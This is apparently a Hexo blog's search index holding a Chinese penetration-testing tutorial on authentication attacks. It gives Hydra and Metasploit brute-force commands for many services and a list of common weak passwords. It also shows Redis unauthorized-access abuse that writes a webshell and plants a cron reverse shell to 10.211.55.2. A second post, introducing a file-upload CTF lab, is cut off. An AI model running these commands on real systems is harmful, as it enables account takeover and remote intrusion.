<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>认证技术</title>
      <link href="/posts/undefined/sec4/"/>
      <url>/posts/undefined/sec4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认证技术"><a href="#认证技术" class="headerlink" title="认证技术"></a>认证技术</h1><p>身份认证技术是用于在计算机网络中确认操作者身份的一种有效的解决方法。计算机网络世界中一切信喜，包括用户的身份信息都是用一组特定的数据来表示的,计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。<br>身份认证攻击就是为了使用各种办法通过这层认证，<strong>突破作为防护网络资产的第一道关口</strong>，身份认证攻击在<strong>渗透测试</strong>中有着举足轻重的作用。<br>对于身份认证攻击可以直接进行爆破攻击，在配置不当的情况下内网中还会经常遇到非授权访问</p><h2 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h2><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><ul><li><strong>不怎么好用</strong><br><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></li></ul><p>俗称“九头蛇”，一款老牌的爆破工具</p><ul><li>常用命令</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># FTP 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ftp:/ /192.168.0.1 -vV</span><br><span class="line"></span><br><span class="line"># SSH 爆破</span><br><span class="line">hydra -L /root/user.txt -P /root/password.txt ssh: / /192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"># SMB 爆破</span><br><span class="line">hydra -l admin -P password.txt 10.211.55.9 smb</span><br><span class="line"></span><br><span class="line"># MSSQL 爆破</span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mssql -vv</span><br><span class="line"></span><br><span class="line"># MySQL 爆破</span><br><span class="line">hydra -L /root/user.txt -P / root/password.txt 192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure><ul><li>l：导入单个用户</li><li>L ：导入一个字典</li><li>p：导入一个密码</li><li>P：导入一个密码字典</li><li>Kali自带上述命令</li></ul><h4 id="SNETCracker"><a href="#SNETCracker" class="headerlink" title="SNETCracker"></a>SNETCracker</h4><ul><li>适合国情的内网爆破工具，安全从业者必备<br>超级弱口令检查工具是一款<strong>Windows平台的弱口令审计工具</strong>，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。</li></ul><blockquote><p>SSH登录发生异常! Could not load file or assembly ‘ChilkatDotNet4.dll’ or one of its dependencies.找不到指定的模块。这个错误是因为需要这个ssh模块需要vc++2010 32位得支持，下载安装就行了。RDP错误一般是<strong>线程</strong>过多，一般建议最好<strong>在10个以内</strong>，自己慢慢试，线程多了就会出问题。</p></blockquote><ul><li>支持 <strong>RDP</strong> 爆破 <strong>3389</strong><br>远程桌面协议RDP(Remote Display Protocol）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般 Windows 服务器陌默认账户为administrator此外如果对方服务器开启了SMB445端口的话尽量优先爆破SMB（445），因为<em>RDP协议比较脆弱，经不起高速的爆破</em>。</li></ul><h4 id="御剑RDP爆破工具"><a href="#御剑RDP爆破工具" class="headerlink" title="御剑RDP爆破工具"></a>御剑RDP爆破工具</h4><ul><li>较为好用 在 github 中下架时查找历史提交记录下载</li></ul><h4 id="railgun"><a href="#railgun" class="headerlink" title="railgun"></a>railgun</h4><p><a href="https://github.com/z520520/railgun">https://github.com/z520520/railgun</a></p><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><ul><li><strong>Kali Linux系统内置Metasploit</strong>，它可以帮助用户识别安全问题，验证漏洞，并对某些软件进行安全评估，提供安全风险情报</li><li><strong>RAPID7</strong>团队出品。<strong>Offensive Security</strong>团队</li></ul><h3 id="国内常见弱口令"><a href="#国内常见弱口令" class="headerlink" title="国内常见弱口令"></a>国内常见弱口令</h3><table><thead><tr><th>Col1</th><th>Col2</th><th>Col3</th><th>Col4</th></tr></thead><tbody><tr><td>123abc</td><td>P@sswOrd</td><td>Huawei@123</td><td>mysql</td></tr><tr><td>123abc*123</td><td>P@sswOrd</td><td>Changme_123</td><td>oracle</td></tr><tr><td>123456</td><td>root@123</td><td>admin@123</td><td>root</td></tr><tr><td>abc123root123</td><td>root1234</td><td>admin</td><td>test</td></tr><tr><td>abc123456</td><td>oracle123!@#</td><td></td><td></td></tr></tbody></table><h3 id="常见爆破服务及端口号总结"><a href="#常见爆破服务及端口号总结" class="headerlink" title="常见爆破服务及端口号总结"></a>常见爆破服务及端口号总结</h3><table><thead><tr><th>服务名称</th><th>端口号</th><th>服务名称</th><th>端口号</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>MySQL</td><td>3360</td></tr><tr><td>Telnet</td><td>23</td><td>RDP</td><td>3389</td></tr><tr><td>SMB</td><td>445</td><td>PostgreSQL</td><td>5432</td></tr><tr><td>MSSQL</td><td>1433</td><td>Redis</td><td>6379</td></tr><tr><td>Oracle</td><td>1521</td><td>Tomcat</td><td>8080</td></tr><tr><td>MongoDb</td><td>27017</td><td></td><td></td></tr></tbody></table><h3 id="爆破-21-FTP"><a href="#爆破-21-FTP" class="headerlink" title="爆破 21 FTP"></a>爆破 21 FTP</h3><p>FTP(File Transfer Protocol，<strong>文件传输协议</strong>)是TCP&#x2F;IP协议组中的协议之一。FTP协议包括两个组成部分，其一为<strong>FTP服务器</strong>，其二为<strong>FTP客户端</strong>。其中<strong>FTP服务器用来存储文件</strong>，用户司以使用<strong>FTP客户端通过FTP协议访问位于FTP服务器上的资源</strong>。</p><ul><li><strong>Docker快速搭建FTP环境:</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#拉取镜像</span><br><span class="line">docker pull fauria/vsftpd</span><br><span class="line"></span><br><span class="line">#构建容器</span><br><span class="line">docker run -d \-p 20:20 \</span><br><span class="line">-p 21:21 \</span><br><span class="line">-p 21100-21110:21100-21110 \-e FTP_USER=admin \</span><br><span class="line">-e FTP_PASS=admin \</span><br><span class="line">-e PASV_ADDRESS=10.20.24.244 \# Docker 宿主机的 IP</span><br><span class="line">-e PASv_MIN_PORT=21100 \</span><br><span class="line">-e PASV_MAX_PORT=21100 \</span><br></pre></td></tr></table></figure><ul><li>Hydra</li><li><strong>超级弱口令爆破工具</strong></li><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner/ftp/ftp_login</span><br><span class="line">show options</span><br><span class="line">set rhosts 10.20.24.244set username admin</span><br><span class="line">set pass_file /Users/sec/Documents/Sec/ hydra/password.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-23-Telnet-比较少见"><a href="#爆破-23-Telnet-比较少见" class="headerlink" title="爆破 23 Telnet 比较少见"></a>爆破 23 Telnet 比较少见</h3><p>Telnet 协议是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机.工作的能力。用户连接上Telnet之后可以直接输入命令，然后这些命令会在服务器上运行，就像直接在控制器的控制台上输入一样。默认端口为23</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner/telnet/telnet_login</span><br><span class="line">show options</span><br><span class="line">set rhosts 10.211.55.9</span><br><span class="line">set user_file /Users/sec/Documents/Sec/hydra/user.txt</span><br><span class="line">set pass_file /Users/sec/Documents/Sec /hydra/password.txt</span><br><span class="line">set threds 5   #线程</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong><br>超级弱口令工具 和 Hydra 爆破 TeInet 不太行，尽量<strong>使用 MSF 爆破TeInet</strong></li></ul><h3 id="爆破-445-SMB"><a href="#爆破-445-SMB" class="headerlink" title="爆破 445 SMB"></a>爆破 445 SMB</h3><p>SMB(Server Message Block) Windows协议，用于<strong>文件和打印共享服务</strong>。默认端口为445</p><ul><li>Hydra</li><li>超级弱口令爆破工具</li><li>railgun</li><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner / smb /smb_login</span><br><span class="line">show options</span><br><span class="line">set rhosts 10.211.55.6</span><br><span class="line">set smbuser admin</span><br><span class="line">set pass_file /root/password.txt</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>坑点记录</strong></li><li><ol><li>超级弱口令工具在爆破高版本系统比如Windows 10就不太好用:</li></ol></li><li><ol><li>Hvdra也不太行:</li></ol></li><li><ol><li>但是此时MSF依然是可以爆破的:</li></ol></li><li><ol><li>另外 SMB爆破还与防火墙是否关闭有关系，总的来说SMB爆破首选 MSF 爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:</li></ol></li><li><ol><li>爆破Samba也,是可以使用MSF或者Hvdra 来讲行爆破的:<br>Samba是种用来让UNIX系列的操作系统与微软Windows 操作系统的SMB网络协议做链接的自由软件。第三版不仅可访问及分享SMB的文件夹及打印机，本身还可以集成入Windows Server的网域，扮演为网域控制站以及加入Active Directory成员</li></ol></li><li><strong>Docker 快速搭建Samba环境:</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#拉取镜像</span><br><span class="line">docker pull dpersoti/ samba</span><br><span class="line"></span><br><span class="line">docker run -it \</span><br><span class="line">--name brute_samba \     #为新的容器命一个名，方便启动、停止、删除等操作，毕竟一长串字符不好输入</span><br><span class="line">-p 139:139 \   #将主机的139端口映射到samba_docker这个容器的139端口上</span><br><span class="line">-p 445:445 \   #将主机的445端口映射到samba_docker这个容器的445端口上</span><br><span class="line">-v/Users/sec/Downloads:/home/shares/shareA\   #将主机上的共享目录向容器进行映射</span><br><span class="line">-d dperson/ samba l#以dperson/ samba这个dockers镜像为模板，建立容器</span><br><span class="line">-w &quot;WORKGROUP&quot; \   #从这里开始是dperson/samba 的参数，上面是docker run的参数。这里指定了工作组</span><br><span class="line">-u &quot;admin ; 123456789&quot;\   #为samba服务设置账户和密码</span><br><span class="line">-s &quot;shareA; / home/shares/shareA; yes;no; no ; admin ;admin ; admin&quot;   #共享文件夹的名称;共享在samba容器中的路径;共享名称对所有工作组用户可见;不是只读(也就是说可写;不允许guest用户;指定共享的所有权用户;指定共享的超级用户;指定具有写权限的用户;</span><br></pre></td></tr></table></figure><h3 id="爆破-1433-MSSQL"><a href="#爆破-1433-MSSQL" class="headerlink" title="爆破 1433 MSSQL"></a>爆破 1433 MSSQL</h3><p>MSSQL是指微软<strong>的SQLServer数据库</strong>，默认端口为1433，默认最高权限用户为 sa，<strong>拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。</strong></p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner/mssql/mssql_login</span><br><span class="line">set RHOSTS 10.211.55.6</span><br><span class="line">set USERNAME sa</span><br><span class="line">set PASS_FILE /root/password.txt</span><br><span class="line">set THREADS 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系<strong>数据库管理系统</strong>。<strong>默认端口为1521端口</strong>，和其他数据库不同的是，爆破前得先爆破对应的SID，不过<strong>SID很多都是默认的</strong>，可以使用MSF来进行爆破。</p><ul><li><strong>Metasploit 爆破SID</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/sid_brute</span><br><span class="line">set RHOSTS 10.211.55.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>Metasploit爆破Oracle</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/oracle_login</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 10.211.55.6</span><br><span class="line">set RPORTS 1521</span><br><span class="line">set SID xXX</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-3360-MySQl"><a href="#爆破-3360-MySQl" class="headerlink" title="爆破 3360 MySQl"></a>爆破 3360 MySQl</h3><p>MySQL是一个关系型<strong>数据库管理系统</strong>，默认端口为3306<br>爆破前检测是否<strong>开启</strong>数据库外连，不要做无意义的爆破，可以手动写Python 脚本来批量验证。</p><ul><li>同一个IP 在短时间内产生太多(超过mysql数据库max_connection_errors的最大值)中断的数据库连接而导致的阻塞</li><li>此时哪怕输入正确的密码也已经无济于事了，解决方法只能重启数据库:</li></ul><h3 id="爆破-3389-RDP"><a href="#爆破-3389-RDP" class="headerlink" title="爆破 3389 RDP"></a>爆破 3389 RDP</h3><p>远程桌面协议RDP(Remote Display Protocol ）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为 3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般Windows服务器陌<em>默认账户为administrator</em> 此外如果对方服务器开启了SMB 445端口的话尽量优先爆破SMB，<strong>因为RDP协议比较脆弱,经不起高速的爆破</strong>。</p><h3 id="爆破-5432-PostgreSQL"><a href="#爆破-5432-PostgreSQL" class="headerlink" title="爆破 5432 PostgreSQL"></a>爆破 5432 PostgreSQL</h3><p>PostgreSQL 是一种<strong>对象-关系型数据库管理系统</strong>，默认端口为 5432 可以直接使用<strong>超级弱口令工具爆破</strong>也可以使用<strong>Metasploit</strong>来进行爆破</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner/ postgres/postgres_login</span><br><span class="line">show options</span><br><span class="line">set RHOSTS 10.211.55.6</span><br><span class="line">RPORTS 5432</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-6379-Redis"><a href="#爆破-6379-Redis" class="headerlink" title="爆破 6379 Redis"></a>爆破 6379 Redis</h3><ul><li>redis 默认没有密码<br>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的API。默认端口为6379<br>可以直接使用超级弱口令工具爆破也可以使用Metasploit:</li><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary / scanner/ redis / redis_login</span><br><span class="line">set RHOSTS 10.211.55.3</span><br><span class="line">set pass_file /root/pass.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>MSF的爆破速度，大概1秒种2个字典<br>编辑配置文件，设置添加密码参数如下:<br><code>requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</code></p><blockquote><p>redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。requirepass至少长度20位以上</p></blockquote><p>重启redis服务，验证查看:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#带密码的连接格式</span><br><span class="line">redis-cli -h 10.211.55.4 -p 6379 -a XXXXXXXX</span><br></pre></td></tr></table></figure><ul><li><strong>还有一种不启动修改 redis 密码</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询当前密码</span><br><span class="line">127.0.0.1:6379&gt; config get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2)&quot;&quot;</span><br><span class="line"></span><br><span class="line">#设置认证密码</span><br><span class="line">127.0.0.1:6379&gt; config set requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f2</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line">#查看密码提示没有认证的登录</span><br><span class="line">127.0.0.1:6379&gt;config get requirepass</span><br><span class="line">(error)NOAUTH Authentication required.</span><br><span class="line"></span><br><span class="line">#auth登录下</span><br><span class="line">127.0.0.1:6379&gt; auth ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line">#再次查看密码</span><br><span class="line">127.0.0.1:6379 &gt; config get requirepass</span><br><span class="line">1) &quot; requirepass&quot;</span><br><span class="line">2) &quot;ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815&quot;</span><br></pre></td></tr></table></figure><p>重启后失效</p><h3 id="爆破-8080-Tomcat"><a href="#爆破-8080-Tomcat" class="headerlink" title="爆破 8080 Tomcat"></a>爆破 8080 Tomcat</h3><p>Tomcat是由 Apache 软件基金会属下Jakarta项目开发的<strong>Servlet容器</strong>，默认端口为8080<br>可以使用Burp的Basic认证爆破也可以直接使用MSF的模块来进行爆破。<strong>Tomcat令是用户名<br>在&#x2F;conf&#x2F;tomcat-users.xml自定义配置的，容易出现弱口令</strong>，<strong>Tomcat口令泄露的话很容易被getshell所有需要加固口令</strong>。</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line">set RHosTsf 10.211.55.3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-27017-MongoDb"><a href="#爆破-27017-MongoDb" class="headerlink" title="爆破 27017 MongoDb"></a>爆破 27017 MongoDb</h3><p>MongoDB是一个基于<strong>分布式文件存储的数据库</strong>，当配置成无验证时，存在未授权访问。默认端口为 <strong>27017</strong> 可以直接使用超级弱口令工具爆破也可以使用Metasploit:</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary /scanner / mongodb/mongodb_login</span><br><span class="line">set RHOSTS 10.211.55.6</span><br><span class="line">set RPORTS 27017</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>未授权访问，顾名思义<strong>不进行请求授权的情况下对需要权限的功能进行访问执行</strong>。通常是由于<strong>认证页面存在缺陷</strong>，无认证，安全配置不当导致。<strong>常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能</strong>越权漏洞。<br>未授权访问通常是会<strong>泄露用户信息，系统信息</strong>。某些服务和系统中，未授权访问还可以<strong>执行系统命令，操作系统文件，导致系统的整体安全遭到破坏</strong>。</p><ul><li>常见未授权访问漏洞总结 <a href="http://xz.aliyun.com/t/6103#toc-13">xz.aliyun.com&#x2F;t&#x2F;6103#toc-13</a></li></ul><h3 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h3><p>Redis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的<strong>日志型、Key-Value数据库</strong>，并提供多种语言的API。<br>Redi 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可<strong>导致敏感信息泄露</strong>，也可以恶意执行操作。</p><h4 id="Redis环境搭建"><a href="#Redis环境搭建" class="headerlink" title="Redis环境搭建"></a>Redis环境搭建</h4><ul><li>Windows安装<br>下载地址: <a href="https://github.com/microsoftarchive/redis/releases">https://github.com/microsoftarchive/redis/releases</a></li></ul><p>打开一个cmd窗口使用命令切换到Redis运行:<br><code>redis-server.exe redis.windows.conf</code></p><p>后面的那个redis.windows.conf可以省略，如果省略，会启用默认的。输入之后，会显示如下界面:<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h553ksapn0j30qj0c9dkh.jpg" alt="image.png"></p><p>这时候另启一个CMD窗口，原来的不要关闭，不然就无法访问服务端了。</p><p><strong>一些基本的交互命令:</strong><br><strong>切换到Redis目录下运行:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line">#查看Redis的相关信息</span><br><span class="line">127.0.0.1:6379&gt;info</span><br><span class="line"></span><br><span class="line">#SET 设置键值对测试</span><br><span class="line">127.0.0.1:6379&gt;SET X&quot;Tomorrow is a another day&quot;</span><br><span class="line">oK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET X</span><br><span class="line">&quot;Tomorrow is a another day&quot;</span><br></pre></td></tr></table></figure><ul><li><strong>Linux编译安装</strong><br>下载地址:<a href="https://redis.io/download">https://redis.io/download</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载Redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"></span><br><span class="line">#解压</span><br><span class="line">tar zxvf redis-5.0.5..tar.gz</span><br><span class="line"></span><br><span class="line">#到src目录下</span><br><span class="line">cd redis-5.0.5/src</span><br><span class="line"></span><br><span class="line">#编译</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">#启动Redis服务:</span><br><span class="line">cd src</span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><blockquote><p>注意这种方式启动Redis使用的是默认配置。也可以通过启动参数告诉Redis使用指定配置文件使用下面命令启动。.&#x2F;src&#x2F;redis-server redis.conf其中 <strong>redis.conf 是一个默认的配置文件</strong>。我们可以<strong>根据需要使用自己的配置文件</strong>。</p></blockquote><p>启动Redis服务进程后，就可以<strong>使用测试客户端程序redis-cli和Redis服务交互了</strong>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali-linux:~/ redis-5.0.5/src# ./ redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">127.0.0. 1:6379&gt;SET y &quot;Linux Redis is Running&quot;</span><br><span class="line">0K</span><br><span class="line">127.0.0.1:6379&gt; GET y</span><br><span class="line">&quot;Linux Redis is Running&quot;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5517wgupsj30q507o436.jpg" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#操作目录</span><br><span class="line">10.211.55.4:6379&gt; config set dir /var/www/html/</span><br><span class="line">OK.</span><br><span class="line"></span><br><span class="line">#操作文件</span><br><span class="line">10.211.55.4:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">#设置数据</span><br><span class="line">10.211.55.4:6379&gt; set x &quot;&lt;?php phpinfo( ) ; ?&gt;&quot;</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line">#写入数据</span><br><span class="line">10.211.55.4:6379&gt;save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="未授权访问弹-shell"><a href="#未授权访问弹-shell" class="headerlink" title="未授权访问弹 shell"></a>未授权访问弹 shell</h3><ul><li><strong>crontab 定时任务</strong><br>Python 实现T00ls自动签到脚本（邮件+钉钉通知)<br>Linux下使用原生的crontab命令实现定时任务了∶</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看定时任务</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">#编辑定时任务</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>编辑定时任务，一行一个任务:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#分时日月星期要运行的命令</span><br><span class="line">30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1</span><br></pre></td></tr></table></figure><p>表示每天9:30自动运行下面的命令:<br><code>/usr/bin/python3 /root/ code/t00ls/TuBi.py</code></p><p>这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示:<br><code>crontab: installing new crontab</code></p><p>这表示新建定时任务成功，后面就可以躺着赚去每天的2个TuBi了。</p><h3 id="crontab实例"><a href="#crontab实例" class="headerlink" title="crontab实例"></a>crontab实例</h3><ul><li><strong>实例1</strong>∶每1分钟执行一次myCommand<br><code>* * * * * myCommand</code></li><li><strong>实例2</strong>:每小时的第3和第15分钟执行<br><code>315 * * * * myCommand</code></li><li><strong>实例3</strong>:在上午8点到11点的第3和第15分钟执行<br><code>3,15 8-11 * * * myCommand</code></li><li><strong>实例4</strong>∶每隔两天的上午8点到11点的第3和第15分钟执行<br><code>3,15 8-11 */2 * * myCommand</code></li><li><strong>实例5</strong>:每周一上午8点到11点的第3和第15分钟执行<br><code>3,15 8-11 * * 1 myCommand</code></li><li><strong>实例6</strong>:每晚的21:30重启smb<br><code>30 21***/etc/init.d/smb restart</code></li><li><strong>实例7</strong>:每月1、10、22日的4:45重启smb<br><code>45 4 1,10,22 * * /etc/init.d/smb restart</code></li><li><strong>实例8</strong>:每周六、周日的1: 10重启smb<br><code>101 * * 6,0 /etc/init.d/ smb restart</code></li><li><strong>实例9</strong>:每天18:00至23 :00之间每隔30分钟重启smb<br><code>0,3018-23 * * * /etc /init.d /smb restart</code></li><li><strong>实例10</strong>:每星期六的晚上23 : 00重启smb<br><code>0 23 * * 6 /etc/init.d/smb restart</code></li><li><strong>实例11</strong>∶每一小时重启smb<br><code>* * /1 * * * / etc/init.d/smb restart</code></li><li><strong>实例12</strong>:晚上11点到早上7点之间，每隔一小时重启smb<br><code>0 23-7 * * * /etc/init.d/smb restart</code></li><li><strong>关于letc&#x2F;crontab 及 &#x2F;varlspool&#x2F;cron&#x2F;crontabs&#x2F;$USER中定义的定时任务</strong><br>&#x2F;etc&#x2F;crontab只有 root用户可以使用，使用时需root权限，而且必须指定运行用户，才会执行;<br><code>* * * * * root myCommand</code><br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;$USER所有用户都可以使用，可以使用crontab -u username -e 命令来直接编辑这个文件:<br><code>* * * * * myCommand</code></li></ul><p>Kali的定时任务为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;$USER shell下有点问题，Ubuntu 16.10已将先前默认的bashshell 更换为了dashshell。Debian和Ubuntu中，&#x2F;bin&#x2F;sh默认已经指向dash，这是一个不同于bash的shell，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比bash要少很多，语法严格遵守POSIX标准。因为缺少了&#x2F;bin&#x2F;ls -bash的交互特性，所以kali中弹不回shelI可以得到很好的解释了。<br><code>ln -fs /bin/bash /bin/sh</code></p><h3 id="nc-命令教程"><a href="#nc-命令教程" class="headerlink" title="nc 命令教程"></a>nc 命令教程</h3><ul><li>nc 命令教程<br>nc被誉为网络安全界的瑞士军刀，<strong>一个简单而有用的工具</strong>，<strong>通过使用TCP或UDP协议的网络连接去读写数据</strong>。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /ar/spool/ cron/ crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * */bin/bash -i &gt;&amp; / dev/tcp/10.211.55.2/2333 0&gt;&amp;1 \n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><ul><li>详细看密码爆破</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 认证技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码爆破</title>
      <link href="/posts/undefined/sec3/"/>
      <url>/posts/undefined/sec3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>这也是认证技术的一部分<br>  因为内容原因特地分出来</p></blockquote><h1 id="BurpSuite-lntruder爆破模块详解"><a href="#BurpSuite-lntruder爆破模块详解" class="headerlink" title="BurpSuite lntruder爆破模块详解"></a>BurpSuite lntruder爆破模块详解</h1><p><strong>本项目的优势</strong>：</p><ol><li><strong>Docker 一键部署</strong>很方便，可以灵活的导入到 CTFd 中</li><li><strong>前面是解题提示和思路，后面带有详细的解题步骤</strong> </li><li>题目更侧重于教学，注重对选手解题的引导，而不是一味地刁难选手</li><li>详细的解题步骤转自<a href="https://www.sqlsec.com/2020/10/upload.html">国光的博客</a></li></ol><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p><strong>DockerHub 项目地址</strong>：<a href="https://hub.docker.com/r/sqlsec/ggctf-upload">https://hub.docker.com/r/sqlsec/ggctf-upload</a><br><strong>Github 项目地址</strong>：<a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a></p><ul><li><strong>推荐使用 Ubuntu 哦</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash# 进入项目文件夹</span><br><span class="line">cd upload-labs-docker</span><br><span class="line"></span><br><span class="line"># 一键部署运行</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>默认 13 个关卡运行的端口为 30001-30013 这 13 个端口上，如果要自定义端口信息的话，自行修改 docker-compose.yml 文件即可。</p><p><img src="/imgs/image-20201026161223134.png" alt="img">  </p><blockquote><p>一共 13 个 Docker 容器，可能第一次部署需要一定的时间，有点硬伤， 耐心等待一下即可</p></blockquote><p><a href="https://image.3001.net/images/20201025/16035979507409.png"><img 